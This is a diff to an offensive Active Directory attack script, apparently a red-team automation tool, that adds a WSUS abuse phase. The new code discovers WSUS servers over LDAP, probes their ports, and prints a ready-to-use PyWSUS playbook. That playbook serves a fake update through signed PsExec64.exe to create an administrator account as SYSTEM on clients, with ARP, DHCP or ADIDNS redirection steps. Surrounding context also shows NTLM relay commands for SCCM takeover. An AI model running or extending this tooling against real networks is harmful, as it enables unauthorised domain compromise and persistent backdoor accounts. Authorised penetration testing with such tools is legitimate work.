@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.26.0"
+readonly VERSION="1.27.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -2168,6 +2168,72 @@ phase_sccm() {
     detail "  # ELEVATE-2 takeover: coerce the site server to you (${ip:-<ip>}) and relay to the site DB / AdminService:"
     detail "  #   impacket-ntlmrelayx -t mssql://<siteDB> -smb2support -q '<grant full admin>'   # or -t http://<SMSProvider>/AdminService --adcs"
     detail "  #   then: python3 ${sh:-sccmhunter.py} admin -u <you> -p '<pass>' -ip <SMSProvider>  → add 'Full Administrator'"
+}
+
+# ===========================================================================
+#  WSUS ABUSE  —  update spoofing. PRECONDITION-GATED on WSUS being present AND
+#  reachable over HTTP (no SSL): only then is it spoofable (a client pulling
+#  updates over HTTP can be served a malicious "update" = SYSTEM). The PORT is
+#  derived from the SERVICE — parsed from the WSUS SPN if it carries one, else the
+#  open WSUS port is auto-detected by probing — never hard-assumed. HTTPS-only or
+#  absent → not auto-abusable. The exploit needs a MITM position between a client
+#  and WSUS (ARP / ADIDNS+WPAD / DHCP) → dynamic-IP PyWSUS playbook. Runs once.
+# ===========================================================================
+WSUS_DONE=0
+phase_wsus() {
+    [[ "$WSUS_DONE" == "1" || -z "$DC_IP" ]] && return
+    WSUS_DONE=1
+
+    # Find the WSUS host + SPN via LDAP (the SERVICE tells us host and, often, port).
+    local base="dc=${DOMAIN//./,dc=}" wfind="" wsrv=""
+    if [[ "$CAP_LDAP" == "1" && -n "$DOMAIN" ]]; then
+        if   [[ -n "$KERB_TICKET" ]]; then wfind=$(KRB5CCNAME="$KERB_TICKET" ldapsearch -LLL -Y GSSAPI -H "ldap://${DC_FQDN:-$DC_IP}" -b "$base" '(|(servicePrincipalName=*WSUS*)(cn=*WSUS*))' dNSHostName servicePrincipalName 2>/dev/null)
+        elif [[ -n "$PASS" ]];       then wfind=$(ldapsearch -LLL -x -H "ldap://$DC_IP" -D "${USER}@${DOMAIN}" -w "$PASS" -b "$base" '(|(servicePrincipalName=*WSUS*)(cn=*WSUS*))' dNSHostName servicePrincipalName 2>/dev/null); fi
+        wsrv=$(grep -oiP 'dNSHostName:\s*\K\S+' <<<"$wfind" | head -1)
+    fi
+    local probe="${wsrv:-$DC_IP}"
+
+    # Port IN FUNCTION OF THE SERVICE: take it from the SPN if present (e.g.
+    # HTTP/host:8530), otherwise auto-detect by probing the WSUS ports and using
+    # whichever the service is actually listening on. Nothing hard-assumed.
+    local -a cand=(); local spn_port; spn_port=$(grep -oiP 'servicePrincipalName:.*?:\K[0-9]{2,5}' <<<"$wfind" | head -1)
+    [[ -n "$spn_port" ]] && cand+=("$spn_port"); cand+=(8530 8531)
+    local wport="" wscheme="" p seen=""
+    for p in "${cand[@]}"; do
+        [[ " $seen " == *" $p "* ]] && continue; seen+=" $p"
+        timeout 3 bash -c "exec 3<>/dev/tcp/$probe/$p" 2>/dev/null || continue
+        wport="$p"; case "$p" in 8531|443) wscheme="https";; *) wscheme="http";; esac; break
+    done
+
+    local wsus_share=0
+    grep -qiE 'WSUSTemp|Remote WSUS Console' "$OUTDIR"/*.txt "$LOGFILE" 2>/dev/null && wsus_share=1
+
+    if [[ -z "$wport" && -z "$wsrv" && "$wsus_share" == 0 ]]; then
+        info "No WSUS detected (no WSUS SPN, no open WSUS port, no WSUSTemp) → WSUS abuse N/A"
+        return
+    fi
+
+    section "WSUS ABUSE · update spoofing (malicious update = SYSTEM on clients)"
+    [[ -n "$wsrv" ]] && loot "WSUS server (LDAP): ${C_BOLD}$wsrv${C_RESET}"
+    [[ "$wsus_share" == 1 ]] && info "WSUSTemp share present → WSUS role confirmed on a host here"
+    [[ -n "$wport" ]] && info "WSUS service detected on ${probe}:${wport} (${wscheme})"
+    local ip; ip="$(attacker_ip)"; local pw; pw="$(external_tool pywsus/pywsus.py)"
+
+    if [[ "$wscheme" == "http" ]]; then
+        loot "★ WSUS on HTTP :${wport} (no SSL) → SPOOFABLE: a client pulling updates over HTTP can be pushed a fake update = SYSTEM"
+        subsection "WSUS spoofing playbook (needs a MITM position between a client and ${wsrv:-$probe})"
+        detail "  # listener IP auto-derived: ${ip:-<your-ip>}   ·   WSUS: ${wsrv:-$probe}:${wport}"
+        detail "  # 1) Carrier = a Microsoft-SIGNED binary (e.g. PsExec64.exe)."
+        detail "  # 2) Serve the malicious update on the SAME port the service uses:"
+        detail "  python3 ${pw:-pywsus.py} -H ${ip:-<ip>} -p ${wport} -e PsExec64.exe -c '/accepteula /s cmd.exe /c \"net user pwn P@ssw0rd! /add && net localgroup administrators pwn /add\"'"
+        detail "  # 3) Redirect the client's WUServer (:${wport}) to you (${ip:-<ip>}): ARP spoof / DHCP / ADIDNS+WPAD."
+        detail "  #    NB: writable DNS on this domain → add an A record for the WSUS hostname → ${ip:-<ip>}."
+        detail "  # → next client update cycle runs your command as NT AUTHORITY\\SYSTEM."
+    elif [[ "$wscheme" == "https" ]]; then
+        info "WSUS on HTTPS :${wport} → SSL-protected; spoofing needs a trusted cert / SSL-strip → NOT auto-abusable."
+    else
+        info "WSUS role present but no WSUS port reachable from here — abusable only from a position that reaches it."
+    fi
 }
 
 # ===========================================================================
@@ -5256,6 +5322,7 @@ assess_current_credential() {
     phase_share_loot;   jitter
     phase_secrets;      jitter
     phase_sccm;         jitter
+    phase_wsus;         jitter
     phase_winrm_dpapi;  jitter
     phase_acl;          jitter
     phase_recycle_disabled; jitter
